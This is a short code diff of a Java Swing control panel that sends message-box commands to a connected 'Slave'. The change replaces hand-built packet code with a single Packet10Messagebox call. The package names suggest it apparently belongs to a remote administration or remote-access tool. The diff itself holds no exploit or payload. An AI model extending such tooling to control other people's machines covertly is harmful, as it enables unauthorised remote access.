@@ -23,6 +23,7 @@ import javax.swing.ScrollPaneConstants;
 import com.redpois0n.Slave;
 import com.redpois0n.packets.OutgoingHeader;
 import com.redpois0n.packets.incoming.PacketBuilder;
+import com.redpois0n.packets.outgoing.Packet10Messagebox;
 
 @SuppressWarnings("serial")
 public class PanelControlMessagebox extends PanelControlParent {
@@ -81,12 +82,7 @@ public class PanelControlMessagebox extends PanelControlParent {
 		JButton btnSend = new JButton("Send");
 		btnSend.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent e) {
-				PacketBuilder packet = new PacketBuilder(OutgoingHeader.MESSAGEBOX);
-				packet.add(chckbxSetSystemFeel.isSelected() + "");
-				packet.add(getIcon() + "");
-				packet.add(txtTitle.getText().trim());
-				packet.add(txtMsg.getText().trim());
-				sl.addToSendQueue(packet);
+				sl.addToSendQueue(new Packet10Messagebox(chckbxSetSystemFeel.isSelected(), getIcon(), txtTitle.getText(), txtMsg.getText()));
 			}
 		});
 		btnSend.setIcon(new ImageIcon(PanelControlMessagebox.class.getResource("/icons/right.png")));
